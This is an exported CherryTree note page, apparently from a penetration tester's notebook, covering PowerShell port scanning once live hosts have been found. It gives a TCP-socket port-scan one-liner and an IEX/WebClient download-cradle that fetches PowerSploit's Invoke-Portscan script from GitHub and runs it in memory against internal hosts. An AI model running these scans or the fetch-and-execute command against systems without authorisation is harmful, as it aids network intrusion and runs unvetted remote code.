<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Powershell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Powershell</h1><br/>Once we’ve identified live hosts, we can then conduct port scans<br /><br />• one-liner port scans <span style="text-decoration:underline;">of one Ip address</span>, without requiring any third-party modules<br />    Change $ports and $ip accordingly <br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span> C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#0088ff;font-weight:400">$ports</span><span style="color:#ff9d00;font-weight:700">=</span>(<span style="color:#333333;font-weight:400">80</span>,<span style="color:#333333;font-weight:400">8080</span>,<span style="color:#333333;font-weight:400">443</span>,<span style="color:#333333;font-weight:400">22</span>);<span style="color:#0088ff;font-weight:400">$ip</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;1.1.1.1&quot;</span>; <span style="color:#ff9d00;font-weight:700">foreach</span> (<span style="color:#0088ff;font-weight:400">$port</span> <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#0088ff;font-weight:400">$ports</span>) {<span style="color:#ff9d00;font-weight:700">try</span>{<span style="color:#0088ff;font-weight:400">$socket</span><span style="color:#ff9d00;font-weight:700">=New-Object</span> System.Net.Sockets.TcpClient(<span style="color:#0088ff;font-weight:400">$ip</span>,<span style="color:#0088ff;font-weight:400">$port</span>);} <span style="color:#ff9d00;font-weight:700">catch</span>{}; <span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#0088ff;font-weight:400">$socket</span> <span style="color:#ff9d00;font-weight:700">-eq</span> <span style="color:#0088ff;font-weight:400">$null</span>) {<span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#0088ff;font-weight:400">$ip</span><span style="color:#3ad900;font-weight:400">&quot;:&quot;</span><span style="color:#0088ff;font-weight:400">$port</span><span style="color:#3ad900;font-weight:400">&quot; - Closed&quot;</span>;}<span style="color:#ff9d00;font-weight:700">else</span>{<span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#0088ff;font-weight:400">$ip</span><span style="color:#3ad900;font-weight:400">&quot;:&quot;</span><span style="color:#0088ff;font-weight:400">$port</span><span style="color:#3ad900;font-weight:400">&quot; - Open&quot;</span>; <span style="color:#0088ff;font-weight:400">$socket</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$null</span>;}}</pre></div><br /><br />• Script port scanner: <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1</a><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1 &#39;</span>);<span style="color:#00117f;font-weight:400">Invoke-Portscan</span> <span style="color:#ff9d00;font-weight:700">-</span>Hosts <span style="color:#3ad900;font-weight:400">&quot;192.168.147.2,192.168.147.139,192.168.147.163,192.168.147.255&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>ports <span style="color:#3ad900;font-weight:400">&quot;53-81&quot;</span></pre></div><br />    <a href=""><img src="images/1370-1.png" alt="images/1370-1.png" /></a></div>
</body>
</html>
